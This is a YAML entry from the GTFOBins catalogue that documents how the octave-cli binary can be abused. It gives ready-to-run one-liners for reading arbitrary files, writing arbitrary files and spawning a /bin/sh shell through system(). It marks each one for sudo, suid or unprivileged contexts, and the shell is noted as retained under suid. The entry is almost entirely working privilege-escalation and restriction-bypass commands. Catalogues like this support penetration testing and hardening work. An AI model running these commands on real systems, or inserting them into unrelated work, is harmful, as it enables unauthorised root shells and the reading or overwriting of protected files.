<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/octave -->
---
comment: |-
  The payloads are compatible with GUI mode.
functions:
  file-read:
  - binary: false
    code: |-
      octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - binary: false
    code: |-
      octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      octave-cli --eval 'system("/bin/sh")'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
